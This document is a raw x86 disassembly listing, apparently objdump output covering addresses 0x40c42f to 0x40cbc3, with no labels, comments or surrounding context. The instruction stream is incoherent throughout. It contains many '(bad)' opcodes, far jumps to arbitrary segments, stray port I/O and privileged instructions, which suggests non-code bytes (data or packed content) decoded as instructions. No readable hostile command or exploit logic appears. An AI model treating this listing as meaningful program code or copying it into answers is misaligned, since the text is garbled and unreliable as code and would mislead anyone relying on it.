  40c42f:	jno    0x40c3e1
  40c431:	jnp    0x40c44f
  40c433:	retf   
  40c434:	jmp    0xfb77:0x7985248a
  40c43b:	nop
  40c43c:	and    BYTE PTR [ecx],al
  40c43e:	mov    ds:0x90b08600,al
  40c443:	sub    bl,BYTE PTR [ebp-0x3b]
  40c446:	pop    eax
  40c447:	enter  0xdce2,0x6c
  40c44b:	mov    ah,0x29
  40c44d:	pop    eax
  40c44e:	jle    0x40c3d5
  40c450:	mov    edi,0x15576b10
  40c455:	and    BYTE PTR [edi-0x9],bh
  40c458:	test   al,0x70
  40c45a:	push   ds
  40c45b:	sbb    edx,DWORD PTR [ebp+0x7fa4731b]
  40c461:	or     bh,BYTE PTR [ebx+0x15]
  40c464:	xchg   esp,eax
  40c465:	jecxz  0x40c478
  40c467:	jmp    0x6ac8:0x99ace4b4
  40c46e:	dec    eax
  40c46f:	mov    ah,0xfe
  40c471:	and    al,0xff
  40c473:	sbb    BYTE PTR [edx-0x5c],al
  40c476:	inc    edx
  40c477:	pop    esp
  40c478:	xor    eax,0x37b253d
  40c47d:	mov    eax,0xb4fc2848
  40c482:	clc    
  40c483:	or     eax,0x413e15
  40c488:	pop    esp
  40c489:	or     BYTE PTR [ebp+0x2770216a],dl
  40c48f:	cdq    
  40c490:	fisubr WORD PTR [ebp-0x67]
  40c493:	int3   
  40c494:	sub    eax,DWORD PTR [eax+0x56]
  40c497:	je     0x40c4ab
  40c499:	sbb    edx,DWORD PTR [ebp-0x1dc0deab]
  40c49f:	push   ss
  40c4a0:	add    eax,0xfe173200
  40c4a5:	pop    edi
  40c4a6:	arpl   WORD PTR [edi-0x7223a9b3],si
  40c4ac:	lock jb 0x40c4c2
  40c4af:	push   es
  40c4b0:	repz fidiv WORD PTR [eax+ebx*1]
  40c4b4:	sbb    bh,BYTE PTR [ecx]
  40c4b6:	jle    0x40c4fc
  40c4b8:	and    esi,eax
  40c4ba:	sar    ah,1
  40c4bc:	add    ah,BYTE PTR [ecx]
  40c4be:	push   ebx
  40c4bf:	mov    DWORD PTR [edx],eax
  40c4c1:	jl     0x40c498
  40c4c3:	into   
  40c4c4:	out    0x20,al
  40c4c6:	sub    dh,BYTE PTR [ebp-0x12]
  40c4c9:	jle    0x40c547
  40c4cb:	mov    ds:0x7be33123,eax
  40c4d0:	int    0x36
  40c4d2:	das    
  40c4d3:	and    eax,0x967e6cdc
  40c4d8:	(bad)  
  40c4d9:	cs cs xchg esp,eax
  40c4dc:	add    DWORD PTR [ebp+0x46],0x14
  40c4e0:	ret    0x6cdc
  40c4e3:	imul   ebp,DWORD PTR [edx+0xdf0e352],0x29a215b
  40c4ed:	mov    al,ds:0xb69baafb
  40c4f2:	out    0x36,al
  40c4f4:	pop    edx
  40c4f5:	mov    ah,0x51
  40c4f7:	dec    edi
  40c4f8:	add    al,0xee
  40c4fa:	mov    BYTE PTR [edx],dl
  40c4fc:	cwde   
  40c4fd:	leave  
  40c4fe:	xor    DWORD PTR [eax+0x6bf7067e],0xc0ae5304
  40c508:	mov    bh,0x9b
  40c50a:	retf   
  40c50b:	rcl    al,cl
  40c50d:	popf   
  40c50e:	push   0x733cfe91
  40c513:	add    bh,BYTE PTR [eax-0x4e]
  40c516:	jno    0x40c4e9
  40c518:	cdq    
  40c519:	or     DWORD PTR [ecx],ebp
  40c51b:	cwde   
  40c51c:	repnz mov eax,0x3b5c4727
  40c522:	into   
  40c523:	aaa    
  40c524:	pop    edi
  40c525:	pop    ebx
  40c526:	push   esi
  40c527:	push   ebx
  40c528:	add    BYTE PTR [edi-0x6528146c],0x3a
  40c52f:	or     DWORD PTR [ecx+0x25b9a051],ebx
  40c535:	aad    0x62
  40c537:	test   BYTE PTR [eax-0xf0f39a4],bl
  40c53d:	pusha  
  40c53e:	rol    BYTE PTR [ebx+0x1146fa3f],1
  40c544:	mov    ebp,0x78022cfd
  40c549:	dec    ecx
  40c54a:	and    DWORD PTR [eax+0x899987d],eax
  40c550:	xor    al,0x43
  40c552:	add    DWORD PTR [eax+ebx*1-0x19],edx
  40c556:	add    bl,al
  40c558:	fild   QWORD PTR ds:[ecx+eiz*1+0x40]
  40c55d:	sub    al,BYTE PTR [eax]
  40c55f:	xor    al,0x7a
  40c561:	pushf  
  40c562:	ins    DWORD PTR es:[edi],dx
  40c563:	stos   DWORD PTR es:[edi],eax
  40c564:	stos   BYTE PTR es:[edi],al
  40c565:	icebp  
  40c566:	cld    
  40c567:	xor    ecx,DWORD PTR [edx]
  40c569:	mov    edi,DWORD PTR ds:[esi]
  40c56c:	pushf  
  40c56d:	lock and eax,0x24333b45
  40c573:	ret    
  40c574:	das    
  40c575:	stc    
  40c576:	mov    ?,WORD PTR [edi]
  40c578:	pop    edi
  40c579:	xor    dl,bh
  40c57b:	sahf   
  40c57c:	push   ds
  40c57d:	mov    WORD PTR [edx+0x1a],cs
  40c580:	ins    BYTE PTR es:[edi],dx
  40c581:	fcomp  DWORD PTR [ebx-0x7a]
  40c584:	in     eax,0xea
  40c586:	inc    ecx
  40c587:	inc    ecx
  40c588:	jns    0x40c53b
  40c58a:	pop    eax
  40c58b:	ror    BYTE PTR [edi],0x9c
  40c58e:	cmp    al,0xad
  40c590:	test   BYTE PTR [edi],ch
  40c592:	adc    bl,0x9b
  40c595:	jmp    0x40c588
  40c597:	sar    BYTE PTR [esi+0x2a14bc41],0xc4
  40c59e:	dec    ebp
  40c59f:	dec    BYTE PTR [ecx]
  40c5a1:	ins    BYTE PTR es:[edi],dx
  40c5a2:	(bad)  
  40c5a3:	pop    ss
  40c5a4:	loop   0x40c5c8
  40c5a6:	xor    eax,0x22c6b79b
  40c5ab:	ret    0x1f06
  40c5ae:	or     al,0x25
  40c5b0:	test   DWORD PTR [eax],ebx
  40c5b2:	cmp    al,0x82
  40c5b4:	cdq    
  40c5b5:	push   ss
  40c5b6:	into   
  40c5b7:	mov    dx,0x85ed
  40c5bb:	push   0x4e
  40c5bd:	xchg   edx,eax
  40c5be:	jle    0x40c59c
  40c5c0:	sub    BYTE PTR fs:[eax+0x1545533b],al
  40c5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5c8:	push   ds
  40c5c9:	sub    DWORD PTR [edx-0x7],eax
  40c5cc:	ds femms 
  40c5cf:	jge    0x40c646
  40c5d1:	add    al,0xdf
  40c5d3:	into   
  40c5d4:	sub    eax,0xd5e7edc6
  40c5d9:	pusha  
  40c5da:	outs   dx,BYTE PTR ds:[esi]
  40c5db:	scas   al,BYTE PTR es:[edi]
  40c5dc:	inc    edx
  40c5dd:	xor    BYTE PTR [ebp+0x3878bc7e],ah
  40c5e3:	sub    ah,ch
  40c5e5:	leave  
  40c5e6:	mov    dh,0x2b
  40c5e8:	test   eax,eax
  40c5ea:	arpl   cx,dx
  40c5ec:	jns    0x40c5a8
  40c5ee:	jmp    0x40c589
  40c5f0:	adc    edi,eax
  40c5f2:	cli    
  40c5f3:	pop    edi
  40c5f4:	mov    eax,ds:0x765f7f84
  40c5f9:	mov    esi,0x6b2ef8a4
  40c5fe:	sub    ebp,eax
  40c600:	cmp    ebx,ebx
  40c602:	dec    esi
  40c603:	loop   0x40c603
  40c605:	mov    dl,0x66
  40c607:	adc    DWORD PTR [esi-0x4a],edi
  40c60a:	add    ebp,0x4e
  40c60d:	stos   BYTE PTR es:[edi],al
  40c60e:	imul   edx,DWORD PTR [edi-0x25],0x19
  40c612:	test   eax,0x2919d38e
  40c617:	inc    esp
  40c618:	outs   dx,BYTE PTR ds:[esi]
  40c619:	imul   esi,DWORD PTR [ecx+0x7a],0x78a636c1
  40c620:	mov    ebp,0xf4c1c9fc
  40c625:	jne    0x40c62e
  40c627:	daa    
  40c628:	nop
  40c629:	ds gs test eax,0xad863fc6
  40c630:	pop    es
  40c631:	jecxz  0x40c64b
  40c633:	push   eax
  40c634:	or     esp,DWORD PTR [eax+0x53]
  40c637:	or     eax,0x87464cf
  40c63c:	(bad)  
  40c63d:	std    
  40c63e:	stos   BYTE PTR es:[edi],al
  40c63f:	jae    0x40c64d
  40c641:	or     edi,DWORD PTR [ebp-0xa2d94d1]
  40c647:	test   BYTE PTR [eax-0x25],bl
  40c64a:	jmp    0x2c2d:0x9d1e16cd
  40c651:	cmp    BYTE PTR [ebx-0x766a4b9b],bl
  40c657:	sub    eax,0xd5427610
  40c65c:	addr16 xchg esi,eax
  40c65e:	sahf   
  40c65f:	and    eax,0xa868c52e
  40c664:	mov    ch,0x13
  40c666:	push   edi
  40c667:	push   0x991cceb
  40c66c:	popa   
  40c66d:	stc    
  40c66e:	addr16 repz mov ecx,0x4f4fb4d9
  40c675:	jmp    0x40c616
  40c677:	stos   DWORD PTR es:[edi],eax
  40c678:	sub    al,0x3f
  40c67a:	dec    ebx
  40c67b:	mov    ch,ch
  40c67d:	push   esi
  40c67e:	out    dx,al
  40c67f:	in     al,0x5a
  40c681:	gs icebp 
  40c683:	test   al,0xf8
  40c685:	cwde   
  40c686:	add    BYTE PTR [ebp-0x78f0e822],dl
  40c68c:	add    al,0x64
  40c68e:	sti    
  40c68f:	test   ebx,ecx
  40c691:	out    dx,al
  40c692:	inc    eax
  40c693:	cmp    esp,DWORD PTR [edx+0x64]
  40c696:	pop    ebx
  40c697:	(bad)  
  40c698:	(bad)  
  40c69a:	dec    esp
  40c69b:	das    
  40c69c:	fadd   st(7),st
  40c69e:	(bad)  
  40c69f:	sbb    al,0x23
  40c6a1:	jge    0x40c70e
  40c6a3:	xor    ah,ah
  40c6a5:	in     eax,0x1a
  40c6a7:	scas   eax,DWORD PTR es:[edi]
  40c6a8:	xchg   ebx,eax
  40c6a9:	mov    edx,0xb47567ab
  40c6ae:	inc    esi
  40c6af:	mov    eax,ds:0xb9f6b547
  40c6b4:	sbb    edx,DWORD PTR [edx-0xd92370d]
  40c6ba:	adc    al,0x68
  40c6bc:	sahf   
  40c6bd:	ins    BYTE PTR es:[edi],dx
  40c6be:	mov    esp,0x9412f59d
  40c6c3:	cmp    BYTE PTR [ebp-0x1434e9a9],dl
  40c6c9:	inc    ebp
  40c6ca:	jmp    0x5098:0x12148af9
  40c6d1:	(bad)  
  40c6d2:	sbb    eax,DWORD PTR [edx]
  40c6d4:	into   
  40c6d5:	jp     0x40c690
  40c6d7:	test   al,0xa9
  40c6d9:	adc    cl,bh
  40c6db:	jbe    0x40c729
  40c6dd:	or     bh,bh
  40c6df:	(bad)  
  40c6e0:	(bad)  
  40c6e1:	cmp    eax,0xbe4a1322
  40c6e6:	mov    esi,0xa68a315f
  40c6eb:	xchg   ecx,eax
  40c6ec:	dec    ecx
  40c6ed:	fnstenv [edi+0x41]
  40c6f0:	push   ds
  40c6f1:	sub    BYTE PTR [esi],0x80
  40c6f4:	mov    DWORD PTR [eax],eax
  40c6f6:	hlt    
  40c6f7:	cmp    ch,al
  40c6f9:	mov    ch,0xfa
  40c6fb:	jno    0x40c74b
  40c6fd:	add    al,0x30
  40c6ff:	fwait
  40c700:	add    ah,al
  40c702:	(bad)  
  40c703:	not    edx
  40c705:	aam    0xc1
  40c707:	xchg   DWORD PTR [ecx-0x36],edi
  40c70a:	xor    BYTE PTR [ecx+0x51],0x53
  40c70e:	clc    
  40c70f:	sub    DWORD PTR [ebp+ebx*4-0x5f],eax
  40c713:	test   BYTE PTR [edx+ebx*4+0x1a],dh
  40c717:	jnp    0x40c6e9
  40c719:	lahf   
  40c71a:	stos   DWORD PTR es:[edi],eax
  40c71b:	mov    ah,0x90
  40c71d:	repnz dec DWORD PTR [ebx+0x247c70ca]
  40c724:	dec    ebx
  40c725:	mov    ss,WORD PTR [ebx]
  40c727:	addr16 pop ebx
  40c729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c72a:	sub    al,0x2b
  40c72c:	pop    DWORD PTR [ebx]
  40c72e:	sti    
  40c72f:	fmul   st(1),st
  40c731:	arpl   WORD PTR [edx+0x34ae3c4e],dx
  40c737:	sahf   
  40c738:	mov    edi,0xf9302035
  40c73d:	xchg   esp,eax
  40c73e:	cli    
  40c73f:	dec    esp
  40c740:	and    esp,DWORD PTR [edx-0x4b0f75be]
  40c746:	loopne 0x40c7c3
  40c748:	out    0x86,al
  40c74a:	push   eax
  40c74b:	cmp    al,0x18
  40c74d:	xchg   edi,eax
  40c74e:	int    0x24
  40c750:	fcmove st,st(7)
  40c752:	xor    eax,0x3a5b653b
  40c757:	aaa    
  40c758:	or     esi,DWORD PTR [edi-0x52]
  40c75b:	int3   
  40c75c:	(bad)  
  40c75d:	fcmovnb st,st(1)
  40c75f:	xor    BYTE PTR [ebp+0xa8b4507],dl
  40c765:	xor    eax,edi
  40c767:	lds    ebp,FWORD PTR [esp+eiz*8+0x7d]
  40c76b:	das    
  40c76c:	or     esp,DWORD PTR [ebx-0x4aefb31]
  40c772:	jle    0x40c7b3
  40c774:	mov    ds:0x8ec46fef,al
  40c779:	jg     0x40c70a
  40c77b:	dec    ebx
  40c77c:	enter  0x9b92,0x97
  40c780:	fcomp  DWORD PTR [esi+0x39]
  40c783:	xor    al,0x2c
  40c785:	cmp    esi,edi
  40c787:	aaa    
  40c788:	push   ebp
  40c789:	xchg   ebp,eax
  40c78a:	retf   
  40c78b:	shl    esi,1
  40c78d:	cmp    al,0xe6
  40c78f:	pushf  
  40c790:	jne    0x40c79d
  40c792:	push   0x7ed4a9c1
  40c797:	cmp    al,0x71
  40c799:	or     al,0x5f
  40c79b:	cwde   
  40c79c:	sub    ch,al
  40c79e:	add    eax,0x8e32f60a
  40c7a3:	std    
  40c7a4:	jp     0x40c7e9
  40c7a6:	lods   eax,DWORD PTR ds:[esi]
  40c7a7:	in     al,dx
  40c7a8:	and    BYTE PTR [ecx+esi*1-0x79],0x6d
  40c7ad:	sti    
  40c7ae:	pop    es
  40c7af:	mov    cl,0x3d
  40c7b1:	in     al,0xc1
  40c7b3:	mov    al,0xb7
  40c7b5:	adc    bh,ah
  40c7b7:	aad    0x57
  40c7b9:	popf   
  40c7ba:	adc    eax,0x79d9d49a
  40c7bf:	sub    al,0x7c
  40c7c1:	sub    dl,BYTE PTR [ebx+0x739119e2]
  40c7c7:	adc    al,0xb3
  40c7c9:	or     esi,DWORD PTR [ebx-0x1c4d6cdc]
  40c7cf:	hlt    
  40c7d0:	nop
  40c7d1:	test   BYTE PTR [eax],al
  40c7d3:	add    ecx,DWORD PTR [edx]
  40c7d5:	sar    BYTE PTR cs:[edx],cl
  40c7d8:	lock adc al,0x66
  40c7db:	mov    edx,0x66b34c05
  40c7e0:	in     eax,0x25
  40c7e2:	push   ss
  40c7e3:	imul   esi,DWORD PTR [ecx],0xfb8ec6c7
  40c7e9:	(bad)  
  40c7eb:	scas   eax,DWORD PTR es:[edi]
  40c7ec:	mov    cl,0xdf
  40c7ee:	mov    dh,0x4b
  40c7f0:	mov    al,ds:0xcfb705dd
  40c7f5:	mov    ebx,0xbe3d1bad
  40c7fa:	dec    eax
  40c7fb:	lods   eax,DWORD PTR ds:[esi]
  40c7fc:	xchg   edi,eax
  40c7fd:	das    
  40c7fe:	icebp  
  40c7ff:	je     0x40c7a1
  40c801:	and    esp,ecx
  40c803:	je     0x40c832
  40c805:	adc    DWORD PTR [ebx+0x5a87b389],0xffffffb8
  40c80c:	jge    0x40c86c
  40c80e:	aas    
  40c80f:	mul    BYTE PTR [edi-0x1f967842]
  40c815:	ins    BYTE PTR es:[edi],dx
  40c816:	pop    gs
  40c818:	mov    cl,0x48
  40c81a:	push   ss
  40c81b:	stc    
  40c81c:	test   DWORD PTR [eax],eax
  40c81e:	or     eax,0xbac4a9cc
  40c823:	ret    
  40c824:	add    edx,0xffffffbd
  40c827:	mov    esp,0xfd7f98c3
  40c82c:	mov    ebx,0xb6da353a
  40c831:	jle    0x40c7d9
  40c833:	add    eax,0x6e9c4334
  40c838:	jge    0x40c86c
  40c83a:	mov    ds:0xc00a6e23,eax
  40c83f:	push   ds
  40c840:	das    
  40c841:	jae    0x40c8a0
  40c843:	icebp  
  40c844:	neg    BYTE PTR [esi]
  40c846:	sbb    eax,0xbebd4805
  40c84b:	mov    dl,0x35
  40c84d:	pop    ds
  40c84e:	jg     0x40c841
  40c850:	xchg   ebp,eax
  40c851:	dec    edx
  40c852:	push   edx
  40c853:	sbb    al,0xdb
  40c855:	sar    DWORD PTR [ebp+0x2cb07c61],cl
  40c85b:	sbb    ebx,edi
  40c85d:	jmp    0x2745900
  40c862:	sbb    BYTE PTR [esi],al
  40c864:	mov    esp,0x9f046c67
  40c869:	push   edi
  40c86a:	jecxz  0x40c830
  40c86c:	inc    ebx
  40c86d:	push   ebx
  40c86e:	mov    dh,0x32
  40c870:	xlat   BYTE PTR ds:[ebx]
  40c871:	ret    
  40c872:	stos   DWORD PTR es:[edi],eax
  40c873:	cmp    dl,BYTE PTR es:[edx]
  40c876:	xchg   ebx,eax
  40c877:	mov    ecx,0xc72c6a6f
  40c87c:	iret   
  40c87d:	ficomp WORD PTR [edx-0x137dc56c]
  40c883:	aaa    
  40c884:	xchg   ebx,eax
  40c885:	ret    0x538a
  40c888:	lds    edx,FWORD PTR [ecx-0x2]
  40c88b:	mov    ds:0xf6170b2e,eax
  40c890:	cmc    
  40c891:	and    bh,BYTE PTR [edx-0x2f]
  40c894:	inc    edx
  40c895:	stc    
  40c896:	outs   dx,BYTE PTR ds:[esi]
  40c897:	int    0x1
  40c899:	call   0x67417639
  40c89e:	mov    eax,0x401c6e00
  40c8a3:	add    dh,ch
  40c8a5:	sbb    al,0x0
  40c8a7:	pop    edi
  40c8a8:	mov    ebx,0x2e088592
  40c8ad:	test   al,0x46
  40c8af:	loopne 0x40c899
  40c8b1:	add    BYTE PTR [edx+0x1e7489aa],0x37
  40c8b8:	adc    edi,DWORD PTR [ebx]
  40c8ba:	int3   
  40c8bb:	std    
  40c8bc:	in     eax,dx
  40c8bd:	mov    eax,ds:0x52ec3ce2
  40c8c2:	push   eax
  40c8c3:	scas   eax,DWORD PTR es:[edi]
  40c8c4:	dec    ebp
  40c8c5:	sub    DWORD PTR [ecx-0x3be4a4f5],ecx
  40c8cb:	mov    bl,BYTE PTR [esi-0x56]
  40c8ce:	aam    0xfa
  40c8d0:	ret    0xcee7
  40c8d3:	and    BYTE PTR [edx-0x70],bl
  40c8d6:	lea    edi,[ebx+0x3]
  40c8d9:	jne    0x40c93d
  40c8db:	add    eax,0x8e3f9e3f
  40c8e0:	mov    dh,0x44
  40c8e2:	dec    esp
  40c8e3:	push   ss
  40c8e4:	cmp    eax,0xd2609d7d
  40c8e9:	shl    DWORD PTR [eax-0x61],1
  40c8ec:	push   0x6de1f94d
  40c8f1:	mov    ds:0x5d42b498,eax
  40c8f6:	mov    dh,0x95
  40c8f8:	mov    bl,0x2d
  40c8fa:	call   0x4fa7:0x5b61a71b
  40c901:	sub    ah,cl
  40c903:	daa    
  40c904:	rcr    DWORD PTR [eax],0xb9
  40c907:	int    0x97
  40c909:	mov    ds:0x375d3165,ax
  40c90f:	pop    ds
  40c910:	(bad)  
  40c911:	fisub  DWORD PTR [ecx]
  40c913:	or     DWORD PTR [esp+ebx*8-0x46],ecx
  40c917:	fcomp  QWORD PTR [eax+0x18]
  40c91a:	xchg   ebp,eax
  40c91b:	jl     0x40c8a3
  40c91d:	lahf   
  40c91e:	mov    ebp,0xa1c1893a
  40c923:	mov    al,ds:0x989ee79c
  40c928:	hlt    
  40c929:	mov    al,dl
  40c92b:	mov    bh,0xc6
  40c92d:	(bad)  
  40c92e:	fsubr  DWORD PTR [ecx-0x31206524]
  40c934:	jmp    0x40c97d
  40c936:	dec    esi
  40c937:	addr16 sbb bh,cl
  40c93a:	push   esp
  40c93b:	push   ebp
  40c93c:	popa   
  40c93d:	shl    eax,1
  40c93f:	sbb    BYTE PTR [esi-0x15],bh
  40c942:	test   eax,0xb4dd0b05
  40c947:	clc    
  40c948:	es icebp 
  40c94a:	hlt    
  40c94b:	leave  
  40c94c:	or     BYTE PTR [esi],al
  40c94e:	mov    edx,0x57ef9587
  40c953:	mov    WORD PTR [edx+0x16b41ab2],ds
  40c959:	cmp    edi,DWORD PTR [ecx+0x10]
  40c95c:	fdiv   st(5),st
  40c95e:	mov    eax,0xca5a6eb1
  40c963:	mov    ds:0x45d00111,eax
  40c968:	sar    BYTE PTR [ebx+0x1c8d927],1
  40c96e:	xor    BYTE PTR [esi],dh
  40c970:	sbb    al,0x88
  40c972:	dec    edi
  40c973:	dec    ecx
  40c974:	push   ebp
  40c975:	and    eax,0x469af47d
  40c97a:	add    ebp,ecx
  40c97c:	mov    eax,ds:0x60a2dc49
  40c981:	in     eax,0xf3
  40c983:	(bad)  
  40c984:	sbb    DWORD PTR [eax-0x4a403a4d],0x3121da80
  40c98e:	pop    eax
  40c98f:	div    esi
  40c991:	imul   esi,DWORD PTR [esi+0x7171daa0],0xfffffff3
  40c998:	repz add ebx,esp
  40c99b:	cmp    DWORD PTR [ecx-0x3c],esp
  40c99e:	mov    ebp,0x91bd6bce
  40c9a3:	mov    bl,0x4a
  40c9a5:	popa   
  40c9a6:	or     ebp,DWORD PTR ss:[edx+0x17e5a79f]
  40c9ad:	cmp    BYTE PTR [edi-0x1a],bl
  40c9b0:	ins    BYTE PTR es:[edi],dx
  40c9b1:	daa    
  40c9b2:	dec    dh
  40c9b4:	js     0x40c94c
  40c9b6:	les    edi,FWORD PTR [edi+0x1ca93969]
  40c9bc:	jns    0x40c9c0
  40c9be:	adc    eax,0xdef2f4e1
  40c9c3:	xor    esp,ecx
  40c9c5:	mov    ebx,DWORD PTR [ebp+edi*8+0x38352bd]
  40c9cc:	xor    BYTE PTR [ebp+0x22],bl
  40c9cf:	push   ebx
  40c9d0:	add    eax,esp
  40c9d2:	sbb    al,0x42
  40c9d4:	in     eax,dx
  40c9d5:	out    0x2,al
  40c9d7:	add    DWORD PTR [ecx-0x24c9981d],ebx
  40c9dd:	add    eax,0x3ecbe3d0
  40c9e2:	fimul  DWORD PTR [eax]
  40c9e4:	loopne 0x40ca2e
  40c9e6:	popf   
  40c9e7:	dec    edi
  40c9e8:	mov    ds:0x8f223c4a,al
  40c9ed:	scas   al,BYTE PTR es:[edi]
  40c9ee:	fstp   TBYTE PTR [esi-0x2ca39612]
  40c9f4:	call   0x8364:0x87b62f83
  40c9fb:	pop    ss
  40c9fc:	test   esp,edi
  40c9fe:	sbb    eax,0x59285383
  40ca03:	in     eax,dx
  40ca04:	xchg   edi,eax
  40ca05:	ins    DWORD PTR es:[edi],dx
  40ca06:	rcr    edi,cl
  40ca08:	push   edx
  40ca09:	jge    0x40c9e6
  40ca0b:	pushf  
  40ca0c:	(bad)  
  40ca0e:	xchg   ebx,eax
  40ca0f:	sbb    al,0x73
  40ca11:	mov    ds:0x7f943b3e,al
  40ca16:	jecxz  0x40ca6d
  40ca18:	push   es
  40ca19:	fs cmp al,0x18
  40ca1c:	inc    esi
  40ca1d:	mov    bl,0x77
  40ca1f:	dec    edx
  40ca20:	push   edx
  40ca21:	(bad)  
  40ca22:	test   DWORD PTR [ebp-0x145c0fdb],0xc8ef312a
  40ca2c:	imul   esp,DWORD PTR [ecx],0xbcfed955
  40ca32:	cmp    eax,0xa901eb34
  40ca37:	mov    bl,0x92
  40ca39:	xor    dh,0x24
  40ca3c:	iret   
  40ca3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3e:	add    BYTE PTR [esi+0x48],ch
  40ca41:	test   DWORD PTR [esi+0x28],ebx
  40ca44:	call   0xba7dd76
  40ca49:	cmp    DWORD PTR [eax],edx
  40ca4b:	add    DWORD PTR [esi+eax*1+0x294c2874],ecx
  40ca52:	or     BYTE PTR [ebp+0x628576b9],ah
  40ca58:	jmp    0x7ce21d82
  40ca5d:	cld    
  40ca5e:	mov    al,ds:0xca5dfb7a
  40ca63:	sbb    eax,0x50ffcfa0
  40ca68:	jmp    0x1fe2:0x8dd58573
  40ca6f:	xchg   ebx,eax
  40ca70:	pusha  
  40ca71:	mov    ebx,0x2f8c3fd1
  40ca76:	jbe    0x40ca5d
  40ca78:	loopne 0x40ca60
  40ca7a:	sbb    bl,BYTE PTR [esi]
  40ca7c:	adc    BYTE PTR [ecx],dh
  40ca7e:	lea    edi,[edi+0x5b]
  40ca81:	out    0xc7,al
  40ca83:	inc    esp
  40ca84:	ja     0x40ca88
  40ca86:	rcr    esi,1
  40ca88:	jle    0x40ca16
  40ca8a:	cmovg  ecx,edi
  40ca8d:	dec    eax
  40ca8e:	add    al,0x72
  40ca90:	jecxz  0x40ca92
  40ca92:	dec    esp
  40ca93:	int    0x6c
  40ca95:	ds (bad) 
  40ca97:	jge    0x40cacb
  40ca99:	mov    ds:0xd5629f1a,eax
  40ca9e:	ficomp DWORD PTR [esi-0x39]
  40caa1:	add    cl,bh
  40caa3:	pop    ecx
  40caa4:	out    0x58,eax
  40caa6:	sub    ah,dh
  40caa8:	sbb    al,0xb0
  40caaa:	jbe    0x40cb09
  40caac:	in     al,dx
  40caad:	mov    esp,0x51bc4c72
  40cab2:	test   cl,al
  40cab4:	sahf   
  40cab5:	jecxz  0x40ca5f
  40cab7:	test   al,0x9d
  40cab9:	lahf   
  40caba:	(bad)  
  40cabb:	jle    0x40cabb
  40cabd:	pop    edi
  40cabe:	mov    al,ds:0x7ab7c726
  40cac3:	sub    eax,0x3af2d99e
  40cac8:	(bad)  
  40cac9:	sub    eax,0x9abcc52d
  40cace:	pop    esp
  40cacf:	in     al,0xfd
  40cad1:	icebp  
  40cad2:	mov    BYTE PTR [ebx],dh
  40cad4:	shl    DWORD PTR [ebx-0x28001d7b],1
  40cada:	into   
  40cadb:	cmc    
  40cadc:	enter  0x67d6,0xb6
  40cae0:	out    0xf1,al
  40cae2:	ds ins BYTE PTR es:[edi],dx
  40cae4:	cmp    eax,0x4a95c214
  40cae9:	jecxz  0x40ca82
  40caeb:	stos   DWORD PTR es:[edi],eax
  40caec:	jle    0x40cb6a
  40caee:	mov    ds:0x7944ea6,eax
  40caf3:	aaa    
  40caf4:	inc    ecx
  40caf5:	push   ecx
  40caf6:	sub    DWORD PTR [edx+0x1f],esi
  40caf9:	lds    ebx,FWORD PTR [ecx+eiz*4+0x3c8ca93e]
  40cb00:	pop    edx
  40cb01:	xchg   esp,eax
  40cb02:	int3   
  40cb03:	dec    eax
  40cb04:	xchg   esp,eax
  40cb05:	test   eax,0x2ca17477
  40cb0a:	jl     0x40cb7a
  40cb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb0e:	pop    edi
  40cb0f:	enter  0x1a16,0xc
  40cb13:	loope  0x40cb2b
  40cb15:	outs   dx,DWORD PTR ds:[esi]
  40cb16:	push   cs
  40cb17:	out    0x2a,al
  40cb19:	imul   eax,eax,0xffffffc3
  40cb1c:	and    BYTE PTR [edx],bh
  40cb1e:	loopne 0x40cabe
  40cb20:	and    esp,DWORD PTR [ecx-0x31]
  40cb23:	imul   ebp,DWORD PTR [edi],0x32
  40cb26:	xchg   ebp,eax
  40cb27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb28:	fwait
  40cb29:	lahf   
  40cb2a:	out    dx,eax
  40cb2b:	es add dh,ah
  40cb2e:	ja     0x40cac8
  40cb30:	(bad)  
  40cb31:	ins    DWORD PTR es:[edi],dx
  40cb32:	loope  0x40cb64
  40cb34:	adc    eax,0xe62429ad
  40cb39:	repz adc DWORD PTR [esi+eax*4+0x62],esp
  40cb3e:	dec    ebp
  40cb3f:	loope  0x40caf0
  40cb41:	push   eax
  40cb42:	push   ss
  40cb43:	mov    edi,0xc2293879
  40cb48:	pop    ds
  40cb49:	pop    esp
  40cb4a:	pop    eax
  40cb4b:	mov    edi,eax
  40cb4d:	xchg   BYTE PTR [edx-0x17],ah
  40cb50:	ret    
  40cb51:	dec    dx
  40cb53:	dec    edx
  40cb54:	or     dl,BYTE PTR [ecx+0x1f5f8b54]
  40cb5a:	xor    edi,esp
  40cb5c:	jg     0x40cb09
  40cb5e:	pop    ebx
  40cb5f:	js     0x40cb61
  40cb61:	jle    0x40caea
  40cb63:	push   ss
  40cb64:	jle    0x40cbd8
  40cb66:	add    BYTE PTR [edx-0x7ef25fba],bh
  40cb6c:	ffree  st(6)
  40cb6e:	les    ebp,FWORD PTR [esi+0x6e]
  40cb71:	and    al,0xb2
  40cb73:	fwait
  40cb74:	imul   ebp,ecx,0x76
  40cb77:	in     eax,dx
  40cb78:	pop    edx
  40cb79:	dec    esi
  40cb7a:	mov    ah,0xb
  40cb7c:	inc    eax
  40cb7d:	push   cs
  40cb7e:	sub    dh,0xb
  40cb81:	fistp  QWORD PTR [edi]
  40cb83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb84:	pop    esp
  40cb85:	cmp    BYTE PTR [eax-0x6b],0x1f
  40cb89:	inc    ebx
  40cb8a:	or     ch,cl
  40cb8c:	cmp    eax,0xee253dd7
  40cb91:	fcmovne st,st(1)
  40cb93:	fs inc eax
  40cb95:	mov    ds:0xef78344c,al
  40cb9a:	imul   edx,DWORD PTR [ecx+0x1d],0x52431f68
  40cba1:	mov    ecx,0x72eddf3a
  40cba6:	or     al,0x91
  40cba8:	ds inc edi
  40cbaa:	jno    0x40cb4b
  40cbac:	push   edx
  40cbad:	jle    0x40cb32
  40cbaf:	inc    ecx
  40cbb0:	daa    
  40cbb1:	mov    cl,0x4c
  40cbb3:	aaa    
  40cbb4:	xchg   esi,eax
  40cbb5:	sbb    BYTE PTR [ebx-0x46a58ef5],ah
  40cbbb:	xchg   esp,eax
  40cbbc:	mov    edi,0x4b02aebe
  40cbc1:	jbe    0x40cb7a
  40cbc3:	and    edi,DWORD PTR [edx+0xc3a4162]
